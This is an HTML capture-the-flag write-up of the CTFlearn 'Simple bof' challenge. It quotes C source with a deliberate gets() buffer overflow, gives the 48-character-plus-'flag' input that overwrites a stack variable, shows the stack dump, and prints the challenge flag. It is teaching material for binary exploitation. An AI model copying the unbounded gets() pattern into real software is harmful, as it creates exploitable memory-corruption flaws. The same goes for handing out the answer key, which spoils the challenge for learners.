
<!DOCTYPE html>
<html>

<body>
    <h1>Simple bof- ctflearn</h1>

    <h2>Challenge Description</h2>
    <p> Want to learn the hacker's secret? Try to smash this buffer!

You need guidance? Look no further than to <a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">Mr. Liveoverflow</a>. He puts out nice videos you should look if you haven't already

nc thekidofarcrania.com 35235
<a href="https://cybersecctf.github.io/blog/2024/practice/ctflearn/simplebuf/bof.c">bof.c</a>

 
</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
        we open bof.c and see is a bufferoverflow in
       <pre>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);
void safeguard();

void print_flag();

void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.     and fill 1 with 32 1 for this                                          
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.and fill i with 16 1 here and then flag for secret

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call! 

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  safeguard();
  vuln();
}
/*
Input some text: 111111111111111111111111111111111111111111111111flag

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret                          
0xffdb72c8 | 31 31 31 31 31 31 31 31 |
0xffdb72d0 | 31 31 31 31 31 31 31 31 |
0xffdb72d8 | 31 31 31 31 31 31 31 31 |
0xffdb72e0 | 31 31 31 31 31 31 31 31 |
0xffdb72e8 | 31 31 31 31 31 31 31 31 |
0xffdb72f0 | 31 31 31 31 31 31 31 31 |
0xffdb72f8 | 66 6c 61 67 00 ff ff ff |
0xffdb7300 | c0 85 fa f7 84 4f 57 56 |
0xffdb7308 | 18 73 db ff 11 2b 57 56 |
0xffdb7310 | 30 73 db ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
*/
</pre>
    we add flag in end of 48 1(32*"1"+16*"1"+"flag") or any char because secret comming after them and should be<pre>  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } </pre>
that 0x67616c66 is hex of flag in reverse(ord('f')=102,hex(102)
'0x66') )and secret should be flag for reach print_flag()  and print flag. 
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">CTFlearn{buffer_0verflows_4re_c00l!}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for work on  binary overflow and  binary exploitation</p>
</body>
</html>


 
